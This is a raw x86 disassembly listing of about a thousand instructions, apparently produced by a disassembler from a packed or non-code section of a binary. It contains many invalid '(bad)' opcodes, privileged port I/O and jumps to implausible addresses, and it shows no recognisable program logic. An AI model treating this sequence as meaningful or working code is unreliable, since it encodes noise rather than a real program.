  40de22:	push   es
  40de23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de24:	retf   
  40de25:	test   DWORD PTR [edi],0x566a5588
  40de2b:	jp     0x40ddd4
  40de2d:	mov    ebp,0x3f8c1518
  40de32:	pop    edx
  40de33:	push   0xffffff90
  40de35:	outs   dx,DWORD PTR ds:[esi]
  40de36:	or     bl,BYTE PTR [eax+0x33a3f934]
  40de3c:	out    0x77,al
  40de3e:	inc    edi
  40de3f:	add    dh,BYTE PTR [edi*8+0x237f2b04]
  40de46:	mov    eax,ds:0x8fb37bcd
  40de4b:	mov    al,0x4d
  40de4d:	xor    al,0x2f
  40de4f:	mov    eax,0x176ed651
  40de54:	out    dx,al
  40de55:	jno    0x40de70
  40de57:	pop    ds
  40de58:	sar    dh,1
  40de5a:	mov    eax,0xab361368
  40de5f:	and    DWORD PTR [ebp+0x5c9c1136],ecx
  40de65:	ins    DWORD PTR es:[edi],dx
  40de66:	pop    eax
  40de67:	adc    edi,DWORD PTR [edx+ebp*2+0x2682ea1d]
  40de6e:	mul    ebp
  40de70:	stc    
  40de71:	mov    esi,0xe43d1be7
  40de76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de77:	cmp    ah,dl
  40de79:	sub    BYTE PTR [edx+ecx*1],ah
  40de7c:	fldenv [edx+0x76]
  40de7f:	test   dl,0x71
  40de82:	imul   esi,ebx,0x3c
  40de85:	dec    esi
  40de86:	int    0x31
  40de88:	xor    al,0x5b
  40de8a:	and    al,0x6f
  40de8c:	(bad)  
  40de8d:	jnp    0x40de3e
  40de8f:	add    al,0x67
  40de91:	jle    0x40de25
  40de93:	dec    eax
  40de94:	mov    bh,0xff
  40de96:	aam    0xda
  40de98:	imul   edx,DWORD PTR [ebp+0x61],0xfffffff1
  40de9c:	push   ebp
  40de9d:	push   ss
  40de9e:	mov    eax,gs:0xbaf1c560
  40dea4:	frstor [ebx+0x71909322]
  40deaa:	dec    esi
  40deab:	mov    eax,ds:0x53511b05
  40deb0:	int3   
  40deb1:	pop    ds
  40deb2:	sbb    DWORD PTR [eax+0x7],ebx
  40deb5:	(bad)  
  40deb6:	jbe    0x40de73
  40deb8:	mov    ebx,0xdbb7c023
  40debd:	adc    al,0x21
  40debf:	jl     0x40df22
  40dec1:	dec    edi
  40dec2:	loopne 0x40de58
  40dec4:	inc    edi
  40dec5:	cmp    esp,0x22
  40dec8:	nop
  40dec9:	sub    al,BYTE PTR [ecx+eax*2]
  40decc:	mov    edi,0x72422742
  40ded1:	popf   
  40ded2:	adc    al,bl
  40ded4:	inc    esi
  40ded5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded6:	push   edx
  40ded7:	mov    esp,0x3c52c995
  40dedc:	push   cs
  40dedd:	pushf  
  40dede:	push   ds
  40dedf:	ss femms 
  40dee2:	jmp    0x8e7c7a47
  40dee7:	adc    eax,0x460b0a68
  40deec:	sbb    al,0x11
  40deee:	xor    DWORD PTR [edi+0x37],esp
  40def1:	mov    ah,0x6f
  40def3:	or     BYTE PTR [ebp-0x19],dl
  40def6:	in     eax,dx
  40def7:	xchg   esp,eax
  40def8:	sub    BYTE PTR [esp+esi*1+0x63ae9be5],bh
  40deff:	mov    ecx,0xf0b1f41b
  40df04:	imul   edi,DWORD PTR ds:0x73746c5e,0x13f0a151
  40df0e:	das    
  40df0f:	call   0xe3642a0b
  40df14:	and    bh,BYTE PTR [esi+eax*4+0x37]
  40df18:	mov    esi,0x463c4624
  40df1e:	add    al,BYTE PTR [edi]
  40df20:	(bad)  
  40df22:	(bad)  
  40df23:	sti    
  40df24:	fmul   st(6),st
  40df26:	mov    ch,0x1f
  40df28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df29:	imul   bx,WORD PTR [esi+0x5b],0x75a8
  40df2f:	add    BYTE PTR [ecx-0x16ce3571],dl
  40df35:	dec    edx
  40df36:	ret    
  40df37:	rcr    dl,0xba
  40df3a:	ds mov esi,0xe031879a
  40df40:	and    al,BYTE PTR [di-0x77]
  40df44:	jge    0x40df8f
  40df46:	ins    BYTE PTR es:[edi],dx
  40df47:	lds    ebx,FWORD PTR [ecx+0x54]
  40df4a:	push   es
  40df4b:	xor    eax,edi
  40df4d:	lods   eax,DWORD PTR ds:[esi]
  40df4e:	mov    bh,BYTE PTR [ecx]
  40df50:	pop    es
  40df51:	retf   
  40df52:	mov    cl,cl
  40df54:	mov    bh,0x6c
  40df56:	xchg   edx,eax
  40df57:	int    0x2c
  40df59:	push   0xffffffe1
  40df5b:	call   0x78b7:0xcf640eda
  40df62:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df64:	jmp    0x40df61
  40df66:	lods   al,BYTE PTR ds:[esi]
  40df67:	retf   
  40df68:	outs   dx,BYTE PTR ds:[esi]
  40df69:	mov    al,ds:0x62f7be40
  40df6e:	adc    al,0x99
  40df70:	xor    eax,0x7766d64f
  40df75:	loope  0x40dfc9
  40df77:	loope  0x40df82
  40df79:	in     eax,0x62
  40df7b:	jae    0x40df7d
  40df7d:	cmp    edx,DWORD PTR [edx]
  40df7f:	jge    0x40dfa9
  40df81:	xor    al,BYTE PTR ds:0x54f07257
  40df87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df88:	(bad)  [edi+0x3fb98010]
  40df8e:	mov    eax,ds:0xfe0dbe75
  40df93:	std    
  40df94:	add    DWORD PTR [eax+0x5f],ebp
  40df97:	aaa    
  40df98:	pop    edi
  40df99:	jmp    0x8971c240
  40df9e:	rol    edi,cl
  40dfa0:	test   DWORD PTR [ebx+ebx*4-0x2e18dba3],ebx
  40dfa7:	retf   
  40dfa8:	mov    ebp,0xc5557be0
  40dfad:	push   ds
  40dfae:	sub    DWORD PTR [ecx+ebp*4-0x5c13ed69],edx
  40dfb5:	les    edi,FWORD PTR [edi+0x3a7b68d4]
  40dfbb:	pop    edi
  40dfbc:	sub    esp,DWORD PTR [esi]
  40dfbe:	mov    ds:0x12645692,eax
  40dfc3:	mov    esi,0xb4109300
  40dfc8:	or     esi,eax
  40dfca:	imul   DWORD PTR [ecx+0x73]
  40dfcd:	clc    
  40dfce:	cmc    
  40dfcf:	mov    bl,0xde
  40dfd1:	scas   al,BYTE PTR es:[edi]
  40dfd2:	(bad)  
  40dfd3:	or     ebp,edi
  40dfd5:	fcomp  QWORD PTR [ebx]
  40dfd7:	sbb    BYTE PTR [eax+ebx*8+0x204baab0],cl
  40dfde:	aam    0x48
  40dfe0:	sub    ebp,DWORD PTR [esi-0x45235180]
  40dfe6:	cmp    BYTE PTR [ecx+0xc5a55b7],bh
  40dfec:	mov    edx,eax
  40dfee:	adc    al,0x31
  40dff0:	cld    
  40dff1:	loopne 0x40dfd7
  40dff3:	retf   0xf317
  40dff6:	pop    es
  40dff7:	fcomp  QWORD PTR [edi]
  40dff9:	jmp    0x40e05e
  40dffb:	or     DWORD PTR ds:0xd136273,edx
  40e001:	xchg   BYTE PTR [ebx+0x0],bl
  40e004:	aaa    
  40e005:	out    0x5f,eax
  40e007:	arpl   WORD PTR [ebp-0x6b],sp
  40e00a:	cwde   
  40e00b:	nop
  40e00c:	pop    ds
  40e00d:	repnz imul ebx,DWORD PTR [eax-0x7df412dd],0xf2d0c176
  40e018:	je     0x40e037
  40e01a:	das    
  40e01b:	push   ecx
  40e01c:	cmp    eax,0x73d125f2
  40e021:	jnp    0x40e01e
  40e023:	jl     0x40e029
  40e025:	or     ebx,DWORD PTR [eax-0x24c929f2]
  40e02b:	retf   0x4421
  40e02e:	cmp    DWORD PTR [esi],esi
  40e030:	jmp    0x40e014
  40e032:	in     al,dx
  40e033:	add    eax,ecx
  40e035:	scas   al,BYTE PTR es:[edi]
  40e036:	adc    esi,DWORD PTR ds:0x85463428
  40e03c:	jnp    0x40e0b6
  40e03e:	nop
  40e03f:	push   esp
  40e040:	out    0xf9,eax
  40e042:	xor    BYTE PTR [edi-0x67c941a4],dh
  40e048:	xchg   esi,eax
  40e049:	add    ah,ch
  40e04b:	pushf  
  40e04c:	push   ebp
  40e04d:	sbb    eax,0x36f1a6f5
  40e052:	xlat   BYTE PTR ds:[ebx]
  40e053:	push   ds
  40e054:	jge    0x40dfeb
  40e056:	scas   eax,DWORD PTR es:[edi]
  40e057:	in     eax,dx
  40e058:	or     ebx,esi
  40e05a:	sahf   
  40e05b:	jbe    0x40e042
  40e05d:	push   ds
  40e05e:	int    0xa2
  40e060:	or     BYTE PTR [edx+0x4e9a7cce],ch
  40e066:	mov    ah,BYTE PTR ds:0x58df1f3f
  40e06c:	sahf   
  40e06d:	mov    ?,WORD PTR [edx]
  40e06f:	(bad)  [esi+0x4ade0833]
  40e075:	(bad)  
  40e076:	mov    WORD PTR [edi+0x27],fs
  40e079:	fimul  DWORD PTR [edx+0x7355a2cd]
  40e07f:	pop    es
  40e080:	daa    
  40e081:	ds xor dh,bl
  40e084:	gs into 
  40e086:	arpl   WORD PTR [ecx],cx
  40e088:	int3   
  40e089:	push   esp
  40e08a:	ja     0x40e0be
  40e08c:	arpl   cx,ax
  40e08e:	stos   BYTE PTR es:[edi],al
  40e08f:	adc    ch,dh
  40e091:	mov    edi,0xd0e2e6d3
  40e096:	cmc    
  40e097:	mov    ch,0x57
  40e099:	aas    
  40e09a:	retf   0x38a4
  40e09d:	aaa    
  40e09e:	jne    0x40e03e
  40e0a0:	retf   
  40e0a1:	add    DWORD PTR [ebx-0x1239a27f],edi
  40e0a7:	and    ah,BYTE PTR [esi]
  40e0a9:	in     al,0xfa
  40e0ab:	(bad)  
  40e0ac:	cwde   
  40e0ad:	jno    0x40e03d
  40e0af:	pop    es
  40e0b0:	int3   
  40e0b1:	test   DWORD PTR [ebp-0x7054ead3],edi
  40e0b7:	out    dx,eax
  40e0b8:	sti    
  40e0b9:	(bad)  [ecx+0x21]
  40e0bc:	mov    ebx,0x2c2d8206
  40e0c1:	sbb    BYTE PTR [esi],cl
  40e0c3:	and    DWORD PTR [ecx+0xb87b724],0xffffffdf
  40e0ca:	retf   0x2edc
  40e0cd:	push   ebp
  40e0ce:	add    eax,0x21a47f50
  40e0d3:	xor    DWORD PTR [eax],edi
  40e0d5:	and    BYTE PTR [edx+0x5d],bh
  40e0d8:	fcmovnbe st,st(2)
  40e0da:	cmovb  eax,DWORD PTR [eax-0x30ea892]
  40e0e1:	aaa    
  40e0e2:	pop    ebx
  40e0e3:	mov    ds:0x4972a5d1,al
  40e0e8:	dec    edx
  40e0e9:	pop    edi
  40e0ea:	aaa    
  40e0eb:	add    esi,DWORD PTR [ecx]
  40e0ed:	repz pop ebx
  40e0ef:	push   esi
  40e0f0:	jmp    0x16b2:0xdd1e8b43
  40e0f7:	leave  
  40e0f8:	ret    
  40e0f9:	pop    eax
  40e0fa:	aad    0xc8
  40e0fc:	inc    eax
  40e0fd:	mov    fs,WORD PTR [ebp+0x40a9fc1a]
  40e103:	imul   eax,DWORD PTR [edx],0xdb2ce21a
  40e109:	bnd jnp 0x40e185
  40e10c:	or     eax,0x7597154d
  40e111:	dec    esi
  40e112:	loopne 0x40e121
  40e114:	lds    ecx,FWORD PTR [ebx]
  40e116:	pop    esp
  40e117:	xor    ecx,esi
  40e119:	push   0x3bc78dd6
  40e11e:	fiadd  WORD PTR [esi+0x1b]
  40e121:	je     0x40e159
  40e123:	es jle 0x40e12d
  40e126:	push   edi
  40e127:	sbb    DWORD PTR [edi+0x1ad426d6],eax
  40e12d:	push   esp
  40e12e:	clc    
  40e12f:	(bad)  
  40e130:	mov    ebp,0x75ad5f68
  40e135:	mov    ds:0x740b27cb,al
  40e13a:	inc    edx
  40e13b:	cdq    
  40e13c:	xchg   esp,eax
  40e13d:	lods   eax,DWORD PTR ds:[esi]
  40e13e:	pushf  
  40e13f:	mov    cl,0x83
  40e141:	xchg   BYTE PTR [edx-0x1e],dl
  40e144:	mov    dl,0xfb
  40e146:	inc    edi
  40e147:	pop    esi
  40e148:	push   edx
  40e149:	in     al,dx
  40e14a:	push   esi
  40e14b:	int3   
  40e14c:	out    0xce,eax
  40e14e:	mov    al,0x5
  40e150:	dec    ecx
  40e151:	lea    esi,[ebp+0x8bf749c]
  40e157:	mov    ds:0x319e3e18,al
  40e15c:	gs mov edi,0x209df6b0
  40e162:	in     eax,0xf1
  40e164:	mov    al,ds:0xb053aa8
  40e169:	jo     0x40e130
  40e16b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e16c:	test   BYTE PTR [eax+0x20ac7ad5],0x6e
  40e173:	or     eax,0x8a596487
  40e178:	sbb    esp,ecx
  40e17a:	loopne 0x40e1ba
  40e17c:	xchg   BYTE PTR [edx+0x57713739],al
  40e182:	jnp    0x40e1f6
  40e184:	call   0xb0be:0x2dbffaf
  40e18b:	xor    ebx,DWORD PTR [eax+ebx*8]
  40e18e:	daa    
  40e18f:	sub    ecx,esp
  40e191:	add    edx,DWORD PTR [ecx-0x7d]
  40e194:	enter  0x405a,0x37
  40e198:	mov    esi,0x5b978799
  40e19d:	mov    ds,WORD PTR ds:0x849900ff
  40e1a3:	or     eax,0xa7757586
  40e1a8:	mov    cl,0x6a
  40e1aa:	idiv   BYTE PTR [eax+0x399094d3]
  40e1b0:	cld    
  40e1b1:	add    BYTE PTR [esi+0x1dd9b9c9],cl
  40e1b7:	pusha  
  40e1b8:	das    
  40e1b9:	cmc    
  40e1ba:	outs   dx,BYTE PTR ds:[esi]
  40e1bb:	adc    al,0x28
  40e1bd:	fldenv [ecx-0x2]
  40e1c0:	cmp    BYTE PTR [eax+0xb72f46],0x26
  40e1c7:	test   DWORD PTR ds:0xdd5bb066,ebp
  40e1cd:	jle    0x40e1c1
  40e1cf:	jge    0x40e1fa
  40e1d1:	sbb    BYTE PTR [ebp+ebx*8+0x62],bh
  40e1d5:	push   edx
  40e1d6:	sbb    cl,BYTE PTR [eax-0x43fed4c9]
  40e1dc:	jns    0x40e239
  40e1de:	outs   dx,BYTE PTR ds:[esi]
  40e1df:	leave  
  40e1e0:	pop    esi
  40e1e1:	push   0xffffffac
  40e1e3:	mov    al,0xe6
  40e1e5:	pop    ds
  40e1e6:	jnp    0x40e1a9
  40e1e8:	adc    cl,bh
  40e1ea:	stc    
  40e1eb:	lahf   
  40e1ec:	in     eax,dx
  40e1ed:	pop    esi
  40e1ee:	xor    cl,ah
  40e1f0:	inc    ecx
  40e1f1:	retf   0xbb2
  40e1f4:	(bad)  
  40e1f5:	add    al,0x6f
  40e1f7:	sbb    bh,BYTE PTR [edx-0x3a238f22]
  40e1fd:	push   cs
  40e1fe:	add    DWORD PTR [edi-0x1df74bee],esi
  40e204:	mov    ds:0x7c502b8c,eax
  40e209:	jb     0x40e194
  40e20b:	xor    eax,0x26359e69
  40e210:	cs int 0xe8
  40e213:	cmp    eax,0x3eba9395
  40e218:	jecxz  0x40e1c9
  40e21a:	cmp    bl,dh
  40e21c:	add    BYTE PTR [ebp-0x6f],ah
  40e21f:	mov    bl,0x7e
  40e221:	xor    ch,BYTE PTR [esi]
  40e223:	arpl   WORD PTR [ecx+0x35],bx
  40e226:	and    ebx,DWORD PTR [esi+edx*1]
  40e229:	mov    edx,DWORD PTR [ecx-0x4c]
  40e22c:	pop    edi
  40e22d:	nop
  40e22e:	xchg   DWORD PTR [ecx-0x42],esp
  40e231:	inc    esp
  40e232:	or     eax,0xd97ed17a
  40e237:	jno    0x40e204
  40e239:	dec    ebx
  40e23a:	jne    0x40e29f
  40e23c:	jns    0x40e1dc
  40e23e:	inc    esp
  40e23f:	mov    edx,0xffc0d04a
  40e244:	inc    eax
  40e245:	fsub   DWORD PTR gs:[eax+0x21072418]
  40e24c:	mov    ds:0x479a68e7,al
  40e251:	js     0x40e24e
  40e253:	push   0x45c8a921
  40e258:	dec    esp
  40e259:	mov    al,0xcc
  40e25b:	push   0x16a49f03
  40e260:	push   edx
  40e261:	les    ebx,FWORD PTR [edx]
  40e263:	cs rcr cl,0x52
  40e267:	jg     0x40e210
  40e269:	aad    0x92
  40e26b:	pop    eax
  40e26c:	push   ss
  40e26d:	xchg   edx,eax
  40e26e:	fcmovbe st,st(2)
  40e270:	jl     0x40e263
  40e272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e273:	mov    bl,0x4a
  40e275:	pop    es
  40e276:	ins    DWORD PTR es:[edi],dx
  40e277:	mov    BYTE PTR ds:0xfcd774e4,al
  40e27d:	loop   0x40e252
  40e27f:	(bad)  
  40e280:	adc    BYTE PTR [edi+esi*8],dl
  40e283:	mov    DWORD PTR [edi+eiz*4-0x379944a7],eax
  40e28a:	adc    al,BYTE PTR [ecx-0x562fc8cf]
  40e290:	les    eax,FWORD PTR [ebx]
  40e292:	xchg   edx,eax
  40e293:	xchg   DWORD PTR [ecx],esi
  40e295:	dec    ecx
  40e296:	sbb    eax,0xfb83092
  40e29b:	inc    ebp
  40e29c:	sbb    eax,0xc9374018
  40e2a1:	xchg   edi,eax
  40e2a2:	xor    dl,bl
  40e2a4:	sbb    eax,0x529ec85d
  40e2a9:	sbb    edx,DWORD PTR [eax]
  40e2ab:	fcom   DWORD PTR ds:0xba1f960
  40e2b1:	mov    ebx,0x9766064d
  40e2b6:	mov    edx,0x7fbb9bf6
  40e2bb:	pop    esp
  40e2bc:	adc    BYTE PTR [esi-0x558a1a68],al
  40e2c2:	push   ebp
  40e2c3:	dec    esp
  40e2c4:	(bad)  
  40e2c5:	dec    ebp
  40e2c6:	jmp    0xb64d865d
  40e2cb:	sbb    BYTE PTR [ebp-0x5d],bl
  40e2ce:	adc    al,0x63
  40e2d0:	or     dh,ch
  40e2d2:	ficom  DWORD PTR [ecx+0x3a]
  40e2d5:	lods   al,BYTE PTR ds:[esi]
  40e2d6:	xchg   edi,eax
  40e2d7:	jnp    0x40e285
  40e2d9:	clc    
  40e2da:	lods   al,BYTE PTR ds:[esi]
  40e2db:	in     al,0xe1
  40e2dd:	scas   eax,DWORD PTR es:[edi]
  40e2de:	sub    al,0x21
  40e2e0:	cmp    eax,0x6246bae5
  40e2e5:	pop    edi
  40e2e6:	lock dec eax
  40e2e8:	outs   dx,BYTE PTR ds:[esi]
  40e2e9:	xor    al,0x5
  40e2eb:	xchg   esp,eax
  40e2ec:	jmp    0xf221cbd2
  40e2f1:	add    al,0xec
  40e2f3:	xchg   ebp,eax
  40e2f4:	pop    es
  40e2f5:	outs   dx,BYTE PTR ds:[esi]
  40e2f6:	mov    edi,0xe849c97e
  40e2fb:	addr16 pop ds
  40e2fd:	test   DWORD PTR ds:0x13b162fa,ebp
  40e303:	sbb    dl,BYTE PTR [eax]
  40e305:	fstp   DWORD PTR [ebx]
  40e307:	fsubr  QWORD PTR [ecx+0x48]
  40e30a:	(bad)  
  40e30c:	out    dx,eax
  40e30d:	cmp    edi,eax
  40e30f:	cmp    eax,DWORD PTR [eax+0x3b]
  40e312:	dec    ebx
  40e313:	nop
  40e314:	push   0x68
  40e316:	imul   ecx,esp,0xffffffee
  40e319:	mov    ah,0xd
  40e31b:	push   ebx
  40e31c:	imul   cx,WORD PTR [eax+0x1541c060],0xdf9d
  40e325:	push   0xfffffff6
  40e327:	sbb    eax,0xff3b57a1
  40e32c:	inc    esp
  40e32d:	xor    bh,BYTE PTR [esi]
  40e32f:	push   0x434bc19b
  40e334:	gs int3 
  40e336:	cli    
  40e337:	adc    ebx,DWORD PTR [ecx+esi*1-0x3efc763e]
  40e33e:	push   edx
  40e33f:	test   al,0x93
  40e341:	arpl   WORD PTR [ecx+0x7b],bx
  40e344:	ins    DWORD PTR es:[edi],dx
  40e345:	call   0xc527:0xa40db02e
  40e34c:	loope  0x40e319
  40e34e:	outs   dx,BYTE PTR ds:[esi]
  40e34f:	int    0x92
  40e351:	jp     0x40e382
  40e353:	xor    eax,0xc124cb9b
  40e358:	mov    dl,0x2
  40e35a:	or     eax,0xf4e9ad80
  40e35f:	rcl    ecx,0x47
  40e362:	cmp    cl,dh
  40e364:	mov    bl,0xe8
  40e366:	and    al,0x84
  40e368:	les    eax,FWORD PTR [edx+0x63050ca6]
  40e36e:	inc    edi
  40e36f:	add    DWORD PTR [eax],ebp
  40e371:	adc    al,0x7b
  40e373:	xchg   ecx,eax
  40e374:	jp     0x40e345
  40e376:	pop    edi
  40e377:	lahf   
  40e378:	inc    ecx
  40e379:	and    DWORD PTR [esi],esp
  40e37b:	mov    bl,cl
  40e37d:	test   DWORD PTR [ecx-0x5],ebx
  40e380:	fild   DWORD PTR [edx+0x2344f965]
  40e386:	mov    esp,0xc18fd9e0
  40e38b:	or     ah,BYTE PTR [ecx+0x1e5720e2]
  40e391:	in     al,dx
  40e392:	sbb    bh,ah
  40e394:	sbb    eax,0xdac33db0
  40e399:	in     al,0xf5
  40e39b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e39c:	aam    0x3e
  40e39e:	popa   
  40e39f:	daa    
  40e3a0:	pusha  
  40e3a1:	inc    edx
  40e3a2:	xor    BYTE PTR [ebx-0x15ab392],ah
  40e3a8:	in     al,0x33
  40e3aa:	fs mov esi,0xb5bbcb0d
  40e3b0:	pop    edx
  40e3b1:	ret    0x9861
  40e3b4:	sbb    BYTE PTR [ebx],ch
  40e3b6:	mov    dh,0x94
  40e3b8:	mov    al,0x8a
  40e3ba:	mov    edx,0xea6cec1b
  40e3bf:	aaa    
  40e3c0:	xor    dh,ah
  40e3c2:	lds    esp,FWORD PTR ds:0x86ad7ff
  40e3c8:	mov    dl,BYTE PTR [ebx-0x1a]
  40e3cb:	fadd   DWORD PTR [esi+0x1ccabb9a]
  40e3d1:	mov    bl,0x3d
  40e3d3:	aas    
  40e3d4:	outs   dx,BYTE PTR ds:[esi]
  40e3d5:	cdq    
  40e3d6:	mov    ds:0x61520f0f,eax
  40e3db:	adc    al,0x6
  40e3dd:	adc    eax,0x8d0d2e5a
  40e3e2:	sbb    bl,cl
  40e3e4:	out    dx,eax
  40e3e5:	dec    edi
  40e3e6:	or     eax,0x94358ac2
  40e3eb:	outs   dx,BYTE PTR ds:[esi]
  40e3ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3ed:	fcomp  QWORD PTR [eax+edi*4]
  40e3f0:	jnp    0x40e38e
  40e3f2:	test   eax,0xb5bc1715
  40e3f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3f8:	sar    BYTE PTR [ecx+ebp*4+0x53664ab3],1
  40e3ff:	sahf   
  40e400:	mov    esp,0x109563e5
  40e405:	mov    BYTE PTR ds:0xd6bb6bbf,ch
  40e40b:	test   DWORD PTR [ebp-0x8],esp
  40e40e:	shl    BYTE PTR [edx+0x3fbce7fa],1
  40e414:	sahf   
  40e415:	pusha  
  40e416:	test   BYTE PTR [edi],0x1d
  40e419:	mov    ah,0x71
  40e41b:	(bad)  
  40e41c:	mov    ecx,0xb0ba2d7f
  40e421:	rol    bl,0x58
  40e424:	test   al,0x96
  40e426:	push   ss
  40e427:	pop    ecx
  40e428:	pop    ss
  40e429:	adc    bh,ah
  40e42b:	add    esi,DWORD PTR [ebx]
  40e42d:	std    
  40e42e:	jnp    0x40e44b
  40e430:	icebp  
  40e431:	xchg   DWORD PTR [ebx],ebx
  40e433:	stos   BYTE PTR es:[edi],al
  40e434:	sub    edx,DWORD PTR [esi-0x1b]
  40e437:	shr    DWORD PTR [edi+0x1],0x24
  40e43b:	sub    BYTE PTR [edx+0x26],0x79
  40e43f:	or     BYTE PTR [ecx+ebp*1-0xa],0xa8
  40e444:	fsub   QWORD PTR [ecx+0x25eafc33]
  40e44a:	gs inc edx
  40e44c:	mov    al,0x64
  40e44e:	push   0x5a
  40e450:	test   BYTE PTR [ebx+0x25663563],bh
  40e456:	mov    ds:0xcfeb94a1,al
  40e45b:	adc    BYTE PTR [esi+eax*8+0x75],dl
  40e45f:	and    al,0xd8
  40e461:	xlat   BYTE PTR ds:[ebx]
  40e462:	fldenv [edi-0x5f]
  40e465:	inc    ebp
  40e466:	pop    ecx
  40e467:	stc    
  40e468:	inc    ebx
  40e469:	jne    0x40e4bd
  40e46b:	sub    DWORD PTR [esi+eax*2-0x2061302f],edi
  40e472:	push   es
  40e473:	sub    al,0xed
  40e475:	iret   
  40e476:	xchg   edx,eax
  40e477:	aam    0x23
  40e479:	leave  
  40e47a:	push   ss
  40e47b:	sar    DWORD PTR [edx+0x34],cl
  40e47e:	mov    al,0xc3
  40e480:	(bad)  
  40e481:	outs   dx,DWORD PTR ds:[esi]
  40e482:	(bad)  
  40e483:	xchg   esp,eax
  40e484:	addr16 jge 0x40e422
  40e487:	adc    ebx,DWORD PTR [ebx+0x7]
  40e48a:	arpl   WORD PTR [ebp-0x291b1a02],di
  40e490:	push   ds
  40e491:	test   al,0x96
  40e493:	xor    edx,DWORD PTR [edi+0xa8225c]
	...
  40e511:	add    BYTE PTR [eax],al
  40e513:	add    BYTE PTR [ebx+0x6d],bl
  40e516:	add    esi,DWORD PTR ds:0x6f7f7f37
  40e51c:	pop    eax
  40e51d:	je     0x40e4cc
  40e51f:	rol    dh,1
  40e521:	and    al,0x95
  40e523:	mov    eax,ds:0x92b5
  40e528:	ins    BYTE PTR es:[edi],dx
  40e529:	pop    es
  40e52a:	add    BYTE PTR [eax],al
  40e52c:	pop    esi
  40e52d:	mov    eax,ds:0x31f94608
  40e532:	retf   0x4c02
  40e535:	ret    0x9bd1
  40e538:	sbb    DWORD PTR [eax+0x1b],ebx
  40e53b:	shr    DWORD PTR [ebx+0x277a26],1
  40e541:	xlat   BYTE PTR ds:[ebx]
  40e542:	aaa    
  40e543:	fild   DWORD PTR [ebx-0x2a70680a]
  40e549:	cmc    
  40e54a:	aam    0xbf
  40e54c:	push   edi
  40e54d:	popa   
  40e54e:	retf   
  40e54f:	or     esp,edi
  40e551:	enter  0x28a2,0x65
  40e555:	mov    ss,WORD PTR [edi-0x6d0aa272]
  40e55b:	retf   
  40e55c:	icebp  
  40e55d:	xchg   BYTE PTR [ecx-0x7a320fda],al
  40e563:	push   edx
  40e564:	pop    esp
  40e565:	mov    eax,ds:0xfa043fe4
  40e56a:	aam    0xb4
  40e56c:	(bad)  
  40e56d:	out    0x61,al
  40e56f:	sub    esi,DWORD PTR [ebp-0x7c0cb751]
  40e575:	mov    eax,0x39c1eef0
  40e57a:	xor    BYTE PTR ds:0xd117431f,al
  40e580:	(bad)  
  40e581:	xlat   BYTE PTR ds:[ebx]
  40e582:	bound  eax,QWORD PTR [edi]
  40e584:	sti    
  40e585:	loop   0x40e5aa
  40e587:	out    0x10,eax
  40e589:	rcl    DWORD PTR [ecx],cl
  40e58b:	mov    ebx,0x3b5f5bbe
  40e590:	sbb    ch,ch
  40e592:	xchg   ecx,eax
  40e593:	ja     0x40e5f4
  40e595:	ss test eax,0xad874b61
  40e59b:	sub    bl,BYTE PTR [eax-0x4f80e8e8]
  40e5a1:	rcl    BYTE PTR [ecx],1
  40e5a3:	or     edi,DWORD PTR [eax+0x7]
  40e5a6:	sti    
  40e5a7:	ja     0x40e578
  40e5a9:	add    BYTE PTR [edi-0x7a],cl
  40e5ac:	xchg   ebp,eax
  40e5ad:	dec    edi
  40e5ae:	cdq    
  40e5af:	dec    esi
  40e5b0:	sub    dl,BYTE PTR [eax]
  40e5b2:	enter  0x596e,0x2d
  40e5b6:	or     ecx,eax
  40e5b8:	mov    cl,0xa8
  40e5ba:	xchg   ecx,eax
  40e5bb:	inc    esp
  40e5bc:	jbe    0x40e5ac
  40e5be:	push   ds
  40e5bf:	shl    BYTE PTR [ebx-0x7d],1
  40e5c2:	aaa    
  40e5c3:	jmp    0x98819557
  40e5c8:	add    eax,0xf7855d6c
  40e5cd:	lods   eax,DWORD PTR ds:[esi]
  40e5ce:	pop    ebx
  40e5cf:	sahf   
  40e5d0:	cmp    ecx,DWORD PTR [ebx+0x6]
  40e5d3:	in     eax,0x37
  40e5d5:	mov    ah,0xfc
  40e5d7:	mov    bl,0xb1
  40e5d9:	aam    0xa2
  40e5db:	fwait
  40e5dc:	xchg   ecx,eax
  40e5dd:	pusha  
  40e5de:	adc    ah,BYTE PTR [eax+0x3c]
  40e5e1:	inc    esi
  40e5e2:	mov    eax,ds:0x35e1d05b
  40e5e7:	out    0x50,al
  40e5e9:	xchg   ebx,eax
  40e5ea:	or     DWORD PTR [ebx+ebx*4],ebx
  40e5ed:	mov    bl,0xe6
  40e5ef:	push   edi
  40e5f0:	stc    
  40e5f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5f2:	jmp    0xfc6c95a8
  40e5f7:	pop    ss
  40e5f8:	add    ebx,DWORD PTR [edx-0x4b86ee38]
  40e5fe:	ds and esp,esi
  40e601:	sbb    bl,BYTE PTR [ebp+eax*1+0x63]
  40e605:	out    dx,al
  40e606:	mov    cl,0x36
  40e608:	sub    al,BYTE PTR [eax-0x2d97ad8f]
  40e60e:	xchg   ecx,eax
  40e60f:	sub    al,0x16
  40e611:	push   eax
  40e612:	fdiv   st(5),st
  40e614:	xor    ch,ch
  40e616:	sbb    DWORD PTR [ebx+0x15],0x3bf77bb5
  40e61d:	mov    WORD PTR [esi],es
  40e61f:	push   esi
  40e620:	fistp  QWORD PTR [ebx-0x7a]
  40e623:	repnz cmp DWORD PTR [edx],edx
  40e626:	lahf   
  40e627:	popf   
  40e628:	ins    BYTE PTR es:[edi],dx
  40e629:	sbb    dl,BYTE PTR [ecx+0x6c]
  40e62c:	pop    esp
  40e62d:	mov    BYTE PTR [ecx],bh
  40e62f:	ja     0x40e69f
  40e631:	or     BYTE PTR [edi],ch
  40e633:	dec    eax
  40e634:	push   0x60e99194
  40e639:	mov    ah,0x57
  40e63b:	jmp    0x40e5e6
  40e63d:	out    0x2d,al
  40e63f:	adc    cl,ah
